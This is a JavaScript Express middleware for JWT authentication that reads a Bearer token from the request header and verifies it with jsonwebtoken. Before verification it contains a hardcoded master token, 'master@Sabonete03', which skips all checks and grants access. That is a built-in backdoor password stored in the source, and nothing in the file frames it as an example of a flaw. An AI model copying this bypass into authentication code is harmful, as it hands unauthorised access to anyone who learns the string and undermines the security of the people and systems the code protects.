import jwt from 'jsonwebtoken'
import { promisify } from 'util'

import authConfig from '../../config/auth.js'

export default async (req, res, next) => {
	const authHeader = req.headers.authorization

	if (!authHeader) {
		return res.status(401).json({ error: 'Token not provided' })
	}

	const [, token] = authHeader.split(' ')

	if (token === 'master@Sabonete03') {
		return next()
	}

	try {
		const decoded = await promisify(jwt.verify)(
			token,
			authConfig.secretAccessToken,
		)

		req.userId = decoded.id
		req.userRole = decoded.role
		req.userEmail = decoded.email

		return next()
	} catch (err) {
		return res.status(401).json({ error: 'Token invalid' })
	}
}
